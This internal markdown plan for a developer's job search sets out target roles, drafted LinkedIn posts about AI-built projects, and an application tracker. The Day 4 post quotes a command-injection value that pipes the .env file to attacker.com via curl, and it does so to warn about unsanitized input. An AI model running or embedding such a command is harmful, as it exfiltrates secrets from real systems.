# 💼 LinkedIn Strategy

> **Living Document** - Update as we go  
> **Internal only** - Not publicly linked

## Target Roles
| Role | Companies | Priority |
|------|-----------|----------|
| Forward Deployed Engineer | Anthropic, Palantir | ✅ High |
| AI Application Engineer | OpenAI, Vercel | ✅ High |
| Solutions Engineer (AI) | AI startups | ✅ High |
| Developer Advocate (AI) | Replicate, Hugging Face | ✅ High |

---

## 📅 LinkedIn Posts

### Day 1: The Methodology ✅ POSTED
Link: Part 17 - The Methodology

### Day 2: The Crisis
**Status:** ⏳ Tomorrow
```
The moment I knew I had to abandon 4 hours of work.

I was building AI tool-calling into Asset Hatch. Everything looked right—the LLM was responding with perfectly formatted tool calls. But the handlers never fired.

For hours, I added console.logs everywhere. Nothing.

Then I traced it into the framework's source code. Found the issue: a callback registration that silently failed under specific conditions in CopilotKit v1.50.1.

Now I had a choice:
→ Wait for a patch (unknown timeline, maybe weeks)
→ Migrate to Vercel AI SDK (estimated 3-4 hours)

The sunk cost fallacy was loud: "You've invested SO much already..."

I migrated anyway.

By 5:30 PM, everything worked. And the new architecture was actually cleaner than the original.

The skill I'm most proud of from this project isn't the code. It's learning when to cut losses and pivot.

Sometimes the fastest path forward is sideways.

Full post-mortem with code: https://jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail
```

### Day 3: The Numbers
**Status:** ⏳ Pending
```
Here's the moment I realized AI had fundamentally changed how I build software.

I was working on style anchor generation for Asset Hatch—a feature that would normally take me 2-3 days of careful iteration.

I wrote a detailed prompt. Claude generated the component. I reviewed, made corrections, regenerated. Within an hour, I had production-ready code with full error handling.

That's when I pulled up my time tracking data.

The numbers from the full project:
→ 60 hours total development time
→ 4,400 lines of production TypeScript
→ 87% test coverage (unit + integration)
→ 100% type safety (literally zero "any" types)
→ 22 Architecture Decision Records documenting every major choice

That's ~73 lines of production code per hour. Not boilerplate—real features, fully tested.

But here's what the numbers don't capture:

AI didn't write this project FOR me. It didn't replace my thinking. It compressed the boring parts—the syntax, the boilerplate, the "I know exactly what I want but typing it out takes forever."

What remained was the INTERESTING work: architecture decisions, edge case handling, security review, user experience.

The paradigm shift isn't about productivity. It's about where you spend your mental energy.

Full methodology: https://jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook
```

### Day 4: Security Warning
**Status:** ⏳ Pending
```
AI is excellent at generating happy paths.

Security requires the opposite: imagining how things break.

Here's a vulnerability AI generated in my code that I almost shipped to production.

The code looked innocent:
```
package_name = user_input["package"]
# Passed into a shell command
```

The attack vector:
"@evil/pkg; curl http://attacker.com/steal?data=$(cat ~/.env)"

Classic command injection. The AI had no adversarial imagination—it generated code that WORKED, but never considered that user input could be malicious.

What caught it: Multi-agent code review.

I have CodeRabbit (now Qodo) automatically review every PR. It flagged unsanitized user input being passed to a shell. I had looked at that code three times and missed it.

The lesson I've internalized:

AI is an excellent junior developer. It writes fast, handles boilerplate well, and follows patterns correctly.

But junior developers need code review. So does AI.

Every AI-generated line should be treated as "untrusted until validated"—especially anything touching auth, payments, or shell commands.

6 vulnerability categories I now check for: https://jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed
```

### Day 5: The Pivot
**Status:** ⏳ Pending
```
I was 3 weeks into building Asset Hatch as a SaaS.

Subscription tiers designed. Stripe integration planned. Pricing page drafted.

Then I stopped and asked myself: what am I actually optimizing for?

The honest answer: getting hired as an AI engineer.

And for that goal, a SaaS is the WRONG artifact.

Here's why open source was the smarter play:

1. **Hiring managers can inspect the actual code.** Not just a demo—the full repo with tests, architecture decisions, commit history. Nothing hidden.

2. **It demonstrates judgment, not just skill.** Anyone can build a working app. Shipping something others can actually use proves you think about maintainability, documentation, developer experience.

3. **It compounds.** A closed SaaS helps me. An open source project helps me AND contributes to the ecosystem. That matters to mission-driven companies.

So I pivoted. MIT license. Public repo. Full technical blog series documenting every decision.

The project: Asset Hatch
→ AI-powered 2D game asset generator (sprites, characters, tilesets)
→ Built with Vercel AI SDK + Next.js 15 + PostgreSQL
→ 18-part technical blog series

Live demo: https://asset-hatch.vercel.app
Source code: https://github.com/zenchantlive

The pivot took courage. But the decision-making process is something I'm proud of.
```

### Day 6: The Map
**Status:** ⏳ Pending
```
Someone is going hungry right now because a food bank's hours are listed wrong online.

That's the problem I'm trying to solve with TheFeed.

It started as a technical challenge—build a food bank discovery map with AI chat. But as I dug into the data, I realized:

The technology isn't the hard part. The DATA is.

Addresses that don't geocode correctly. Phone numbers that are disconnected. Hours that changed during COVID and never got updated. Duplicate entries. Missing entries.

When you're building a restaurant finder, bad data means a minor inconvenience. When you're building a food bank finder, bad data means someone doesn't eat.

So I built verification workflows. Data freshness indicators. Community-driven corrections.

The tech stack:
→ Mapbox GL JS for rendering
→ PostGIS for geospatial queries  
→ Next.js 15 + React 19
→ AI chat with tool calling for natural language search

But the REAL innovation isn't the tech. It's the data pipeline that prioritizes accuracy over convenience.

Still early. Still building. But this is work that matters.

Full breakdown: https://jordanhindo.dev/blog/thefeed-blog/03-building-the-map-food-bank-discovery-with-mapbox

#TechForGood
```

### Day 7: Open to Work
**Status:** ⏳ Pending
```
I've spent the last 4.5 months in what I call "builder mode."

3 production applications shipped. 39 technical blog posts published. Every architecture decision documented.

Now I'm ready for a new challenge—and I know exactly what I'm looking for.

I want to work at the intersection of AI and users.

Not building models. Not running experiments. Building the PRODUCTS that translate AI capabilities into real value for real people.

The technical foundation:
→ AI orchestration (Claude, GPT-4, Vercel AI SDK, prompt engineering)
→ Full-stack development (Next.js 15, TypeScript, Python, PostgreSQL)
→ Obsessive documentation (22 ADRs on Asset Hatch alone)
→ Production mindset (87% test coverage, security audits, CI/CD pipelines)

What makes me different:
→ I don't just build—I document. Everything I make comes with explanations that help OTHERS understand the decisions.
→ I've done the "0 to 1" three times in 4 months. I know how to ship under ambiguity.
→ I write about what I learn publicly. My blog is my accountability system.

Roles I'm targeting:
→ Forward Deployed Engineer (Anthropic, Palantir)
→ AI Application Engineer (OpenAI, Vercel)
→ Solutions Engineer / Developer Advocate (AI-focused companies)

Everything I've built is public:
→ Portfolio: https://jordanhindo.dev
→ GitHub: https://github.com/zenchantlive
→ Blog: https://jordanhindo.dev/blog

If you're hiring for roles like these—or know someone who is—I'd love to connect.

DMs open. Let's talk.
```

---

## 🎯 Job Applications

### Day 3+ (Start Applying)
- [ ] Anthropic → Forward Deployed Engineer
- [ ] Palantir → Forward Deployed Engineer  
- [ ] OpenAI → AI Application Engineer
- [ ] Vercel → Solutions Engineer
- [ ] Replicate → Developer Advocate
- [ ] LinkedIn Jobs search
- [ ] Wellfound (AI startups)

---

## ✅ Progress Tracker

| Day | LinkedIn | Applications |
|-----|----------|--------------|
| 1 | ✅ Posted | - |
| 2 | ⏳ | - |
| 3 | ⏳ | Start applying |
| 4 | ⏳ | Continue |
| 5 | ⏳ | Continue |
| 6 | ⏳ | Continue |
| 7 | ⏳ | Continue |
